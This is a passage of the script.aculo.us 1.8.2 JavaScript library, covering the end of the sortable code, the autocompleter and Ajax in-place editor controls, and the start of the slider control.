      return item.id.match(options.format) ? item.id.match(options.format)[1] : '';
    });
  },

  setSequence: function(element, new_sequence) {
    element = $(element);
    var options = Object.extend(this.options(element), arguments[2] || { });

    var nodeMap = { };
    this.findElements(element, options).each( function(n) {
        if (n.id.match(options.format))
            nodeMap[n.id.match(options.format)[1]] = [n, n.parentNode];
        n.parentNode.removeChild(n);
    });

    new_sequence.each(function(ident) {
      var n = nodeMap[ident];
      if (n) {
        n[1].appendChild(n[0]);
        delete nodeMap[ident];
      }
    });
  },

  serialize: function(element) {
    element = $(element);
    var options = Object.extend(Sortable.options(element), arguments[1] || { });
    var name = encodeURIComponent(
      (arguments[1] && arguments[1].name) ? arguments[1].name : element.id);

    if (options.tree) {
      return Sortable.tree(element, arguments[1]).children.map( function (item) {
        return [name + Sortable._constructIndex(item) + "[id]=" +
                encodeURIComponent(item.id)].concat(item.children.map(arguments.callee));
      }).flatten().join('&');
    } else {
      return Sortable.sequence(element, arguments[1]).map( function(item) {
        return name + "[]=" + encodeURIComponent(item);
      }).join('&');
    }
  }
};

// Returns true if child is contained within element
Element.isParent = function(child, element) {
  if (!child.parentNode || child == element) return false;
  if (child.parentNode == element) return true;
  return Element.isParent(child.parentNode, element);
};

Element.findChildren = function(element, only, recursive, tagName) {
  if(!element.hasChildNodes()) return null;
  tagName = tagName.toUpperCase();
  if(only) only = [only].flatten();
  var elements = [];
  $A(element.childNodes).each( function(e) {
    if(e.tagName && e.tagName.toUpperCase()==tagName &&
      (!only || (Element.classNames(e).detect(function(v) { return only.include(v) }))))
        elements.push(e);
    if(recursive) {
      var grandchildren = Element.findChildren(e, only, recursive, tagName);
      if(grandchildren) elements.push(grandchildren);
    }
  });

  return (elements.length>0 ? elements.flatten() : []);
};

Element.offsetSize = function (element, type) {
  return element['offset' + ((type=='vertical' || type=='height') ? 'Height' : 'Width')];
};
// script.aculo.us controls.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Thomas Fuchs (http://script.aculo.us, http://mir.aculo.us)
//           (c) 2005-2008 Ivan Krstic (http://blogs.law.harvard.edu/ivan)
//           (c) 2005-2008 Jon Tirsen (http://www.tirsen.com)
// Contributors:
//  Richard Livsey
//  Rahul Bhargava
//  Rob Wills
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

// Autocompleter.Base handles all the autocompletion functionality
// that's independent of the data source for autocompletion. This
// includes drawing the autocompletion menu, observing keyboard
// and mouse events, and similar.
//
// Specific autocompleters need to provide, at the very least,
// a getUpdatedChoices function that will be invoked every time
// the text inside the monitored textbox changes. This method
// should get the text for which to provide autocompletion by
// invoking this.getToken(), NOT by directly accessing
// this.element.value. This is to allow incremental tokenized
// autocompletion. Specific auto-completion logic (AJAX, etc)
// belongs in getUpdatedChoices.
//
// Tokenized incremental autocompletion is enabled automatically
// when an autocompleter is instantiated with the 'tokens' option
// in the options parameter, e.g.:
// new Ajax.Autocompleter('id','upd', '/url/', { tokens: ',' });
// will incrementally autocomplete with a comma as the token.
// Additionally, ',' in the above example can be replaced with
// a token array, e.g. { tokens: [',', '\n'] } which
// enables autocompletion on multiple tokens. This is most
// useful when one of the tokens is \n (a newline), as it
// allows smart autocompletion after linebreaks.

if(typeof Effect == 'undefined')
  throw("controls.js requires including script.aculo.us' effects.js library");

var Autocompleter = { };
Autocompleter.Base = Class.create({
  baseInitialize: function(element, update, options) {
    element          = $(element);
    this.element     = element;
    this.update      = $(update);
    this.hasFocus    = false;
    this.changed     = false;
    this.active      = false;
    this.index       = 0;
    this.entryCount  = 0;
    this.oldElementValue = this.element.value;

    if(this.setOptions)
      this.setOptions(options);
    else
      this.options = options || { };

    this.options.paramName    = this.options.paramName || this.element.name;
    this.options.tokens       = this.options.tokens || [];
    this.options.frequency    = this.options.frequency || 0.4;
    this.options.minChars     = this.options.minChars || 1;
    this.options.onShow       = this.options.onShow ||
      function(element, update){
        if(!update.style.position || update.style.position=='absolute') {
          update.style.position = 'absolute';
          Position.clone(element, update, {
            setHeight: false,
            offsetTop: element.offsetHeight
          });
        }
        Effect.Appear(update,{duration:0.15});
      };
    this.options.onHide = this.options.onHide ||
      function(element, update){ new Effect.Fade(update,{duration:0.15}) };

    if(typeof(this.options.tokens) == 'string')
      this.options.tokens = new Array(this.options.tokens);
    // Force carriage returns as token delimiters anyway
    if (!this.options.tokens.include('\n'))
      this.options.tokens.push('\n');

    this.observer = null;

    this.element.setAttribute('autocomplete','off');

    Element.hide(this.update);

    Event.observe(this.element, 'blur', this.onBlur.bindAsEventListener(this));
    Event.observe(this.element, 'keydown', this.onKeyPress.bindAsEventListener(this));
  },

  show: function() {
    if(Element.getStyle(this.update, 'display')=='none') this.options.onShow(this.element, this.update);
    if(!this.iefix &&
      (Prototype.Browser.IE) &&
      (Element.getStyle(this.update, 'position')=='absolute')) {
      new Insertion.After(this.update,
       '<iframe id="' + this.update.id + '_iefix" '+
       'style="display:none;position:absolute;filter:progid:DXImageTransform.Microsoft.Alpha(opacity=0);" ' +
       'src="javascript:false;" frameborder="0" scrolling="no"></iframe>');
      this.iefix = $(this.update.id+'_iefix');
    }
    if(this.iefix) setTimeout(this.fixIEOverlapping.bind(this), 50);
  },

  fixIEOverlapping: function() {
    Position.clone(this.update, this.iefix, {setTop:(!this.update.style.height)});
    this.iefix.style.zIndex = 1;
    this.update.style.zIndex = 2;
    Element.show(this.iefix);
  },

  hide: function() {
    this.stopIndicator();
    if(Element.getStyle(this.update, 'display')!='none') this.options.onHide(this.element, this.update);
    if(this.iefix) Element.hide(this.iefix);
  },

  startIndicator: function() {
    if(this.options.indicator) Element.show(this.options.indicator);
  },

  stopIndicator: function() {
    if(this.options.indicator) Element.hide(this.options.indicator);
  },

  onKeyPress: function(event) {
    if(this.active)
      switch(event.keyCode) {
       case Event.KEY_TAB:
       case Event.KEY_RETURN:
         this.selectEntry();
         Event.stop(event);
       case Event.KEY_ESC:
         this.hide();
         this.active = false;
         Event.stop(event);
         return;
       case Event.KEY_LEFT:
       case Event.KEY_RIGHT:
         return;
       case Event.KEY_UP:
         this.markPrevious();
         this.render();
         Event.stop(event);
         return;
       case Event.KEY_DOWN:
         this.markNext();
         this.render();
         Event.stop(event);
         return;
      }
     else
       if(event.keyCode==Event.KEY_TAB || event.keyCode==Event.KEY_RETURN ||
         (Prototype.Browser.WebKit > 0 && event.keyCode == 0)) return;

    this.changed = true;
    this.hasFocus = true;

    if(this.observer) clearTimeout(this.observer);
      this.observer =
        setTimeout(this.onObserverEvent.bind(this), this.options.frequency*1000);
  },

  activate: function() {
    this.changed = false;
    this.hasFocus = true;
    this.getUpdatedChoices();
  },

  onHover: function(event) {
    var element = Event.findElement(event, 'LI');
    if(this.index != element.autocompleteIndex)
    {
        this.index = element.autocompleteIndex;
        this.render();
    }
    Event.stop(event);
  },

  onClick: function(event) {
    var element = Event.findElement(event, 'LI');
    this.index = element.autocompleteIndex;
    this.selectEntry();
    this.hide();
  },

  onBlur: function(event) {
    // needed to make click events working
    setTimeout(this.hide.bind(this), 250);
    this.hasFocus = false;
    this.active = false;
  },

  render: function() {
    if(this.entryCount > 0) {
      for (var i = 0; i < this.entryCount; i++)
        this.index==i ?
          Element.addClassName(this.getEntry(i),"selected") :
          Element.removeClassName(this.getEntry(i),"selected");
      if(this.hasFocus) {
        this.show();
        this.active = true;
      }
    } else {
      this.active = false;
      this.hide();
    }
  },

  markPrevious: function() {
    if(this.index > 0) this.index--;
      else this.index = this.entryCount-1;
    //this.getEntry(this.index).scrollIntoView(true); useless
  },

  markNext: function() {
    if(this.index < this.entryCount-1) this.index++;
      else this.index = 0;
    this.getEntry(this.index).scrollIntoView(false);
  },

  getEntry: function(index) {
    return this.update.firstChild.childNodes[index];
  },

  getCurrentEntry: function() {
    return this.getEntry(this.index);
  },

  selectEntry: function() {
    this.active = false;
    this.updateElement(this.getCurrentEntry());
  },

  updateElement: function(selectedElement) {
    if (this.options.updateElement) {
      this.options.updateElement(selectedElement);
      return;
    }
    var value = '';
    if (this.options.select) {
      var nodes = $(selectedElement).select('.' + this.options.select) || [];
      if(nodes.length>0) value = Element.collectTextNodes(nodes[0], this.options.select);
    } else
      value = Element.collectTextNodesIgnoreClass(selectedElement, 'informal');

    var bounds = this.getTokenBounds();
    if (bounds[0] != -1) {
      var newValue = this.element.value.substr(0, bounds[0]);
      var whitespace = this.element.value.substr(bounds[0]).match(/^\s+/);
      if (whitespace)
        newValue += whitespace[0];
      this.element.value = newValue + value + this.element.value.substr(bounds[1]);
    } else {
      this.element.value = value;
    }
    this.oldElementValue = this.element.value;
    this.element.focus();

    if (this.options.afterUpdateElement)
      this.options.afterUpdateElement(this.element, selectedElement);
  },

  updateChoices: function(choices) {
    if(!this.changed && this.hasFocus) {
      this.update.innerHTML = choices;
      Element.cleanWhitespace(this.update);
      Element.cleanWhitespace(this.update.down());

      if(this.update.firstChild && this.update.down().childNodes) {
        this.entryCount =
          this.update.down().childNodes.length;
        for (var i = 0; i < this.entryCount; i++) {
          var entry = this.getEntry(i);
          entry.autocompleteIndex = i;
          this.addObservers(entry);
        }
      } else {
        this.entryCount = 0;
      }

      this.stopIndicator();
      this.index = 0;

      if(this.entryCount==1 && this.options.autoSelect) {
        this.selectEntry();
        this.hide();
      } else {
        this.render();
      }
    }
  },

  addObservers: function(element) {
    Event.observe(element, "mouseover", this.onHover.bindAsEventListener(this));
    Event.observe(element, "click", this.onClick.bindAsEventListener(this));
  },

  onObserverEvent: function() {
    this.changed = false;
    this.tokenBounds = null;
    if(this.getToken().length>=this.options.minChars) {
      this.getUpdatedChoices();
    } else {
      this.active = false;
      this.hide();
    }
    this.oldElementValue = this.element.value;
  },

  getToken: function() {
    var bounds = this.getTokenBounds();
    return this.element.value.substring(bounds[0], bounds[1]).strip();
  },

  getTokenBounds: function() {
    if (null != this.tokenBounds) return this.tokenBounds;
    var value = this.element.value;
    if (value.strip().empty()) return [-1, 0];
    var diff = arguments.callee.getFirstDifferencePos(value, this.oldElementValue);
    var offset = (diff == this.oldElementValue.length ? 1 : 0);
    var prevTokenPos = -1, nextTokenPos = value.length;
    var tp;
    for (var index = 0, l = this.options.tokens.length; index < l; ++index) {
      tp = value.lastIndexOf(this.options.tokens[index], diff + offset - 1);
      if (tp > prevTokenPos) prevTokenPos = tp;
      tp = value.indexOf(this.options.tokens[index], diff + offset);
      if (-1 != tp && tp < nextTokenPos) nextTokenPos = tp;
    }
    return (this.tokenBounds = [prevTokenPos + 1, nextTokenPos]);
  }
});

Autocompleter.Base.prototype.getTokenBounds.getFirstDifferencePos = function(newS, oldS) {
  var boundary = Math.min(newS.length, oldS.length);
  for (var index = 0; index < boundary; ++index)
    if (newS[index] != oldS[index])
      return index;
  return boundary;
};

Ajax.Autocompleter = Class.create(Autocompleter.Base, {
  initialize: function(element, update, url, options) {
    this.baseInitialize(element, update, options);
    this.options.asynchronous  = true;
    this.options.onComplete    = this.onComplete.bind(this);
    this.options.defaultParams = this.options.parameters || null;
    this.url                   = url;
  },

  getUpdatedChoices: function() {
    this.startIndicator();

    var entry = encodeURIComponent(this.options.paramName) + '=' +
      encodeURIComponent(this.getToken());

    this.options.parameters = this.options.callback ?
      this.options.callback(this.element, entry) : entry;

    if(this.options.defaultParams)
      this.options.parameters += '&' + this.options.defaultParams;

    new Ajax.Request(this.url, this.options);
  },

  onComplete: function(request) {
    this.updateChoices(request.responseText);
  }
});

// The local array autocompleter. Used when you'd prefer to
// inject an array of autocompletion options into the page, rather
// than sending out Ajax queries, which can be quite slow sometimes.
//
// The constructor takes four parameters. The first two are, as usual,
// the id of the monitored textbox, and id of the autocompletion menu.
// The third is the array you want to autocomplete from, and the fourth
// is the options block.
//
// Extra local autocompletion options:
// - choices - How many autocompletion choices to offer
//
// - partialSearch - If false, the autocompleter will match entered
//                    text only at the beginning of strings in the
//                    autocomplete array. Defaults to true, which will
//                    match text at the beginning of any *word* in the
//                    strings in the autocomplete array. If you want to
//                    search anywhere in the string, additionally set
//                    the option fullSearch to true (default: off).
//
// - fullSsearch - Search anywhere in autocomplete array strings.
//
// - partialChars - How many characters to enter before triggering
//                   a partial match (unlike minChars, which defines
//                   how many characters are required to do any match
//                   at all). Defaults to 2.
//
// - ignoreCase - Whether to ignore case when autocompleting.
//                 Defaults to true.
//
// It's possible to pass in a custom function as the 'selector'
// option, if you prefer to write your own autocompletion logic.
// In that case, the other options above will not apply unless
// you support them.

Autocompleter.Local = Class.create(Autocompleter.Base, {
  initialize: function(element, update, array, options) {
    this.baseInitialize(element, update, options);
    this.options.array = array;
  },

  getUpdatedChoices: function() {
    this.updateChoices(this.options.selector(this));
  },

  setOptions: function(options) {
    this.options = Object.extend({
      choices: 10,
      partialSearch: true,
      partialChars: 2,
      ignoreCase: true,
      fullSearch: false,
      selector: function(instance) {
        var ret       = []; // Beginning matches
        var partial   = []; // Inside matches
        var entry     = instance.getToken();
        var count     = 0;

        for (var i = 0; i < instance.options.array.length &&
          ret.length < instance.options.choices ; i++) {

          var elem = instance.options.array[i];
          var foundPos = instance.options.ignoreCase ?
            elem.toLowerCase().indexOf(entry.toLowerCase()) :
            elem.indexOf(entry);

          while (foundPos != -1) {
            if (foundPos == 0 && elem.length != entry.length) {
              ret.push("<li><strong>" + elem.substr(0, entry.length) + "</strong>" +
                elem.substr(entry.length) + "</li>");
              break;
            } else if (entry.length >= instance.options.partialChars &&
              instance.options.partialSearch && foundPos != -1) {
              if (instance.options.fullSearch || /\s/.test(elem.substr(foundPos-1,1))) {
                partial.push("<li>" + elem.substr(0, foundPos) + "<strong>" +
                  elem.substr(foundPos, entry.length) + "</strong>" + elem.substr(
                  foundPos + entry.length) + "</li>");
                break;
              }
            }

            foundPos = instance.options.ignoreCase ?
              elem.toLowerCase().indexOf(entry.toLowerCase(), foundPos + 1) :
              elem.indexOf(entry, foundPos + 1);

          }
        }
        if (partial.length)
          ret = ret.concat(partial.slice(0, instance.options.choices - ret.length));
        return "<ul>" + ret.join('') + "</ul>";
      }
    }, options || { });
  }
});

// AJAX in-place editor and collection editor
// Full rewrite by Christophe Porteneuve <tdd@tddsworld.com> (April 2007).

// Use this if you notice weird scrolling problems on some browsers,
// the DOM might be a bit confused when this gets called so do this
// waits 1 ms (with setTimeout) until it does the activation
Field.scrollFreeActivate = function(field) {
  setTimeout(function() {
    Field.activate(field);
  }, 1);
};

Ajax.InPlaceEditor = Class.create({
  initialize: function(element, url, options) {
    this.url = url;
    this.element = element = $(element);
    this.prepareOptions();
    this._controls = { };
    arguments.callee.dealWithDeprecatedOptions(options); // DEPRECATION LAYER!!!
    Object.extend(this.options, options || { });
    if (!this.options.formId && this.element.id) {
      this.options.formId = this.element.id + '-inplaceeditor';
      if ($(this.options.formId))
        this.options.formId = '';
    }
    if (this.options.externalControl)
      this.options.externalControl = $(this.options.externalControl);
    if (!this.options.externalControl)
      this.options.externalControlOnly = false;
    this._originalBackground = this.element.getStyle('background-color') || 'transparent';
    this.element.title = this.options.clickToEditText;
    this._boundCancelHandler = this.handleFormCancellation.bind(this);
    this._boundComplete = (this.options.onComplete || Prototype.emptyFunction).bind(this);
    this._boundFailureHandler = this.handleAJAXFailure.bind(this);
    this._boundSubmitHandler = this.handleFormSubmission.bind(this);
    this._boundWrapperHandler = this.wrapUp.bind(this);
    this.registerListeners();
  },
  checkForEscapeOrReturn: function(e) {
    if (!this._editing || e.ctrlKey || e.altKey || e.shiftKey) return;
    if (Event.KEY_ESC == e.keyCode)
      this.handleFormCancellation(e);
    else if (Event.KEY_RETURN == e.keyCode)
      this.handleFormSubmission(e);
  },
  createControl: function(mode, handler, extraClasses) {
    var control = this.options[mode + 'Control'];
    var text = this.options[mode + 'Text'];
    if ('button' == control) {
      var btn = document.createElement('input');
      btn.type = 'submit';
      btn.value = text;
      btn.className = 'editor_' + mode + '_button';
      if ('cancel' == mode)
        btn.onclick = this._boundCancelHandler;
      this._form.appendChild(btn);
      this._controls[mode] = btn;
    } else if ('link' == control) {
      var link = document.createElement('a');
      link.href = '#';
      link.appendChild(document.createTextNode(text));
      link.onclick = 'cancel' == mode ? this._boundCancelHandler : this._boundSubmitHandler;
      link.className = 'editor_' + mode + '_link';
      if (extraClasses)
        link.className += ' ' + extraClasses;
      this._form.appendChild(link);
      this._controls[mode] = link;
    }
  },
  createEditField: function() {
    var text = (this.options.loadTextURL ? this.options.loadingText : this.getText());
    var fld;
    if (1 >= this.options.rows && !/\r|\n/.test(this.getText())) {
      fld = document.createElement('input');
      fld.type = 'text';
      var size = this.options.size || this.options.cols || 0;
      if (0 < size) fld.size = size;
    } else {
      fld = document.createElement('textarea');
      fld.rows = (1 >= this.options.rows ? this.options.autoRows : this.options.rows);
      fld.cols = this.options.cols || 40;
    }
    fld.name = this.options.paramName;
    fld.value = text; // No HTML breaks conversion anymore
    fld.className = 'editor_field';
    if (this.options.submitOnBlur)
      fld.onblur = this._boundSubmitHandler;
    this._controls.editor = fld;
    if (this.options.loadTextURL)
      this.loadExternalText();
    this._form.appendChild(this._controls.editor);
  },
  createForm: function() {
    var ipe = this;
    function addText(mode, condition) {
      var text = ipe.options['text' + mode + 'Controls'];
      if (!text || condition === false) return;
      ipe._form.appendChild(document.createTextNode(text));
    };
    this._form = $(document.createElement('form'));
    this._form.id = this.options.formId;
    this._form.addClassName(this.options.formClassName);
    this._form.onsubmit = this._boundSubmitHandler;
    this.createEditField();
    if ('textarea' == this._controls.editor.tagName.toLowerCase())
      this._form.appendChild(document.createElement('br'));
    if (this.options.onFormCustomization)
      this.options.onFormCustomization(this, this._form);
    addText('Before', this.options.okControl || this.options.cancelControl);
    this.createControl('ok', this._boundSubmitHandler);
    addText('Between', this.options.okControl && this.options.cancelControl);
    this.createControl('cancel', this._boundCancelHandler, 'editor_cancel');
    addText('After', this.options.okControl || this.options.cancelControl);
  },
  destroy: function() {
    if (this._oldInnerHTML)
      this.element.innerHTML = this._oldInnerHTML;
    this.leaveEditMode();
    this.unregisterListeners();
  },
  enterEditMode: function(e) {
    if (this._saving || this._editing) return;
    this._editing = true;
    this.triggerCallback('onEnterEditMode');
    if (this.options.externalControl)
      this.options.externalControl.hide();
    this.element.hide();
    this.createForm();
    this.element.parentNode.insertBefore(this._form, this.element);
    if (!this.options.loadTextURL)
      this.postProcessEditField();
    if (e) Event.stop(e);
  },
  enterHover: function(e) {
    if (this.options.hoverClassName)
      this.element.addClassName(this.options.hoverClassName);
    if (this._saving) return;
    this.triggerCallback('onEnterHover');
  },
  getText: function() {
    return this.element.innerHTML.unescapeHTML();
  },
  handleAJAXFailure: function(transport) {
    this.triggerCallback('onFailure', transport);
    if (this._oldInnerHTML) {
      this.element.innerHTML = this._oldInnerHTML;
      this._oldInnerHTML = null;
    }
  },
  handleFormCancellation: function(e) {
    this.wrapUp();
    if (e) Event.stop(e);
  },
  handleFormSubmission: function(e) {
    var form = this._form;
    var value = $F(this._controls.editor);
    this.prepareSubmission();
    var params = this.options.callback(form, value) || '';
    if (Object.isString(params))
      params = params.toQueryParams();
    params.editorId = this.element.id;
    if (this.options.htmlResponse) {
      var options = Object.extend({ evalScripts: true }, this.options.ajaxOptions);
      Object.extend(options, {
        parameters: params,
        onComplete: this._boundWrapperHandler,
        onFailure: this._boundFailureHandler
      });
      new Ajax.Updater({ success: this.element }, this.url, options);
    } else {
      var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
      Object.extend(options, {
        parameters: params,
        onComplete: this._boundWrapperHandler,
        onFailure: this._boundFailureHandler
      });
      new Ajax.Request(this.url, options);
    }
    if (e) Event.stop(e);
  },
  leaveEditMode: function() {
    this.element.removeClassName(this.options.savingClassName);
    this.removeForm();
    this.leaveHover();
    this.element.style.backgroundColor = this._originalBackground;
    this.element.show();
    if (this.options.externalControl)
      this.options.externalControl.show();
    this._saving = false;
    this._editing = false;
    this._oldInnerHTML = null;
    this.triggerCallback('onLeaveEditMode');
  },
  leaveHover: function(e) {
    if (this.options.hoverClassName)
      this.element.removeClassName(this.options.hoverClassName);
    if (this._saving) return;
    this.triggerCallback('onLeaveHover');
  },
  loadExternalText: function() {
    this._form.addClassName(this.options.loadingClassName);
    this._controls.editor.disabled = true;
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        this._form.removeClassName(this.options.loadingClassName);
        var text = transport.responseText;
        if (this.options.stripLoadedTextTags)
          text = text.stripTags();
        this._controls.editor.value = text;
        this._controls.editor.disabled = false;
        this.postProcessEditField();
      }.bind(this),
      onFailure: this._boundFailureHandler
    });
    new Ajax.Request(this.options.loadTextURL, options);
  },
  postProcessEditField: function() {
    var fpc = this.options.fieldPostCreation;
    if (fpc)
      $(this._controls.editor)['focus' == fpc ? 'focus' : 'activate']();
  },
  prepareOptions: function() {
    this.options = Object.clone(Ajax.InPlaceEditor.DefaultOptions);
    Object.extend(this.options, Ajax.InPlaceEditor.DefaultCallbacks);
    [this._extraDefaultOptions].flatten().compact().each(function(defs) {
      Object.extend(this.options, defs);
    }.bind(this));
  },
  prepareSubmission: function() {
    this._saving = true;
    this.removeForm();
    this.leaveHover();
    this.showSaving();
  },
  registerListeners: function() {
    this._listeners = { };
    var listener;
    $H(Ajax.InPlaceEditor.Listeners).each(function(pair) {
      listener = this[pair.value].bind(this);
      this._listeners[pair.key] = listener;
      if (!this.options.externalControlOnly)
        this.element.observe(pair.key, listener);
      if (this.options.externalControl)
        this.options.externalControl.observe(pair.key, listener);
    }.bind(this));
  },
  removeForm: function() {
    if (!this._form) return;
    this._form.remove();
    this._form = null;
    this._controls = { };
  },
  showSaving: function() {
    this._oldInnerHTML = this.element.innerHTML;
    this.element.innerHTML = this.options.savingText;
    this.element.addClassName(this.options.savingClassName);
    this.element.style.backgroundColor = this._originalBackground;
    this.element.show();
  },
  triggerCallback: function(cbName, arg) {
    if ('function' == typeof this.options[cbName]) {
      this.options[cbName](this, arg);
    }
  },
  unregisterListeners: function() {
    $H(this._listeners).each(function(pair) {
      if (!this.options.externalControlOnly)
        this.element.stopObserving(pair.key, pair.value);
      if (this.options.externalControl)
        this.options.externalControl.stopObserving(pair.key, pair.value);
    }.bind(this));
  },
  wrapUp: function(transport) {
    this.leaveEditMode();
    // Can't use triggerCallback due to backward compatibility: requires
    // binding + direct element
    this._boundComplete(transport, this.element);
  }
});

Object.extend(Ajax.InPlaceEditor.prototype, {
  dispose: Ajax.InPlaceEditor.prototype.destroy
});

Ajax.InPlaceCollectionEditor = Class.create(Ajax.InPlaceEditor, {
  initialize: function($super, element, url, options) {
    this._extraDefaultOptions = Ajax.InPlaceCollectionEditor.DefaultOptions;
    $super(element, url, options);
  },

  createEditField: function() {
    var list = document.createElement('select');
    list.name = this.options.paramName;
    list.size = 1;
    this._controls.editor = list;
    this._collection = this.options.collection || [];
    if (this.options.loadCollectionURL)
      this.loadCollection();
    else
      this.checkForExternalText();
    this._form.appendChild(this._controls.editor);
  },

  loadCollection: function() {
    this._form.addClassName(this.options.loadingClassName);
    this.showLoadingText(this.options.loadingCollectionText);
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        var js = transport.responseText.strip();
        if (!/^\[.*\]$/.test(js)) // TODO: improve sanity check
          throw('Server returned an invalid collection representation.');
        this._collection = eval(js);
        this.checkForExternalText();
      }.bind(this),
      onFailure: this.onFailure
    });
    new Ajax.Request(this.options.loadCollectionURL, options);
  },

  showLoadingText: function(text) {
    this._controls.editor.disabled = true;
    var tempOption = this._controls.editor.firstChild;
    if (!tempOption) {
      tempOption = document.createElement('option');
      tempOption.value = '';
      this._controls.editor.appendChild(tempOption);
      tempOption.selected = true;
    }
    tempOption.update((text || '').stripScripts().stripTags());
  },

  checkForExternalText: function() {
    this._text = this.getText();
    if (this.options.loadTextURL)
      this.loadExternalText();
    else
      this.buildOptionList();
  },

  loadExternalText: function() {
    this.showLoadingText(this.options.loadingText);
    var options = Object.extend({ method: 'get' }, this.options.ajaxOptions);
    Object.extend(options, {
      parameters: 'editorId=' + encodeURIComponent(this.element.id),
      onComplete: Prototype.emptyFunction,
      onSuccess: function(transport) {
        this._text = transport.responseText.strip();
        this.buildOptionList();
      }.bind(this),
      onFailure: this.onFailure
    });
    new Ajax.Request(this.options.loadTextURL, options);
  },

  buildOptionList: function() {
    this._form.removeClassName(this.options.loadingClassName);
    this._collection = this._collection.map(function(entry) {
      return 2 === entry.length ? entry : [entry, entry].flatten();
    });
    var marker = ('value' in this.options) ? this.options.value : this._text;
    var textFound = this._collection.any(function(entry) {
      return entry[0] == marker;
    }.bind(this));
    this._controls.editor.update('');
    var option;
    this._collection.each(function(entry, index) {
      option = document.createElement('option');
      option.value = entry[0];
      option.selected = textFound ? entry[0] == marker : 0 == index;
      option.appendChild(document.createTextNode(entry[1]));
      this._controls.editor.appendChild(option);
    }.bind(this));
    this._controls.editor.disabled = false;
    Field.scrollFreeActivate(this._controls.editor);
  }
});

//**** DEPRECATION LAYER FOR InPlace[Collection]Editor! ****
//**** This only  exists for a while,  in order to  let ****
//**** users adapt to  the new API.  Read up on the new ****
//**** API and convert your code to it ASAP!            ****

Ajax.InPlaceEditor.prototype.initialize.dealWithDeprecatedOptions = function(options) {
  if (!options) return;
  function fallback(name, expr) {
    if (name in options || expr === undefined) return;
    options[name] = expr;
  };
  fallback('cancelControl', (options.cancelLink ? 'link' : (options.cancelButton ? 'button' :
    options.cancelLink == options.cancelButton == false ? false : undefined)));
  fallback('okControl', (options.okLink ? 'link' : (options.okButton ? 'button' :
    options.okLink == options.okButton == false ? false : undefined)));
  fallback('highlightColor', options.highlightcolor);
  fallback('highlightEndColor', options.highlightendcolor);
};

Object.extend(Ajax.InPlaceEditor, {
  DefaultOptions: {
    ajaxOptions: { },
    autoRows: 3,                                // Use when multi-line w/ rows == 1
    cancelControl: 'link',                      // 'link'|'button'|false
    cancelText: 'cancel',
    clickToEditText: 'Click to edit',
    externalControl: null,                      // id|elt
    externalControlOnly: false,
    fieldPostCreation: 'activate',              // 'activate'|'focus'|false
    formClassName: 'inplaceeditor-form',
    formId: null,                               // id|elt
    highlightColor: '#ffff99',
    highlightEndColor: '#ffffff',
    hoverClassName: '',
    htmlResponse: true,
    loadingClassName: 'inplaceeditor-loading',
    loadingText: 'Loading...',
    okControl: 'button',                        // 'link'|'button'|false
    okText: 'ok',
    paramName: 'value',
    rows: 1,                                    // If 1 and multi-line, uses autoRows
    savingClassName: 'inplaceeditor-saving',
    savingText: 'Saving...',
    size: 0,
    stripLoadedTextTags: false,
    submitOnBlur: false,
    textAfterControls: '',
    textBeforeControls: '',
    textBetweenControls: ''
  },
  DefaultCallbacks: {
    callback: function(form) {
      return Form.serialize(form);
    },
    onComplete: function(transport, element) {
      // For backward compatibility, this one is bound to the IPE, and passes
      // the element directly.  It was too often customized, so we don't break it.
      new Effect.Highlight(element, {
        startcolor: this.options.highlightColor, keepBackgroundImage: true });
    },
    onEnterEditMode: null,
    onEnterHover: function(ipe) {
      ipe.element.style.backgroundColor = ipe.options.highlightColor;
      if (ipe._effect)
        ipe._effect.cancel();
    },
    onFailure: function(transport, ipe) {
      alert('Error communication with the server: ' + transport.responseText.stripTags());
    },
    onFormCustomization: null, // Takes the IPE and its generated form, after editor, before controls.
    onLeaveEditMode: null,
    onLeaveHover: function(ipe) {
      ipe._effect = new Effect.Highlight(ipe.element, {
        startcolor: ipe.options.highlightColor, endcolor: ipe.options.highlightEndColor,
        restorecolor: ipe._originalBackground, keepBackgroundImage: true
      });
    }
  },
  Listeners: {
    click: 'enterEditMode',
    keydown: 'checkForEscapeOrReturn',
    mouseover: 'enterHover',
    mouseout: 'leaveHover'
  }
});

Ajax.InPlaceCollectionEditor.DefaultOptions = {
  loadingCollectionText: 'Loading options...'
};

// Delayed observer, like Form.Element.Observer,
// but waits for delay after last key input
// Ideal for live-search fields

Form.Element.DelayedObserver = Class.create({
  initialize: function(element, delay, callback) {
    this.delay     = delay || 0.5;
    this.element   = $(element);
    this.callback  = callback;
    this.timer     = null;
    this.lastValue = $F(this.element);
    Event.observe(this.element,'keyup',this.delayedListener.bindAsEventListener(this));
  },
  delayedListener: function(event) {
    if(this.lastValue == $F(this.element)) return;
    if(this.timer) clearTimeout(this.timer);
    this.timer = setTimeout(this.onTimerEvent.bind(this), this.delay * 1000);
    this.lastValue = $F(this.element);
  },
  onTimerEvent: function() {
    this.timer = null;
    this.callback(this.element, $F(this.element));
  }
});
// script.aculo.us slider.js v1.8.2, Tue Nov 18 18:30:58 +0100 2008

// Copyright (c) 2005-2008 Marty Haught, Thomas Fuchs
//
// script.aculo.us is freely distributable under the terms of an MIT-style license.
// For details, see the script.aculo.us web site: http://script.aculo.us/

if (!Control) var Control = { };

// options:
//  axis: 'vertical', or 'horizontal' (default)
//
// callbacks:
//  onChange(value)
//  onSlide(value)
Control.Slider = Class.create({
  initialize: function(handle, track, options) {
    var slider = this;

    if (Object.isArray(handle)) {
      this.handles = handle.collect( function(e) { return $(e) });
    } else {
      this.handles = [$(handle)];
    }

    this.track   = $(track);
    this.options = options || { };

    this.axis      = this.options.axis || 'horizontal';
    this.increment = this.options.increment || 1;
    this.step      = parseInt(this.options.step || '1');
    this.range     = this.options.range || $R(0,1);

    this.value     = 0; // assure backwards compat
    this.values    = this.handles.map( function() { return 0 });
    this.spans     = this.options.spans ? this.options.spans.map(function(s){ return $(s) }) : false;
    this.options.startSpan = $(this.options.startSpan || null);
    this.options.endSpan   = $(this.options.endSpan || null);

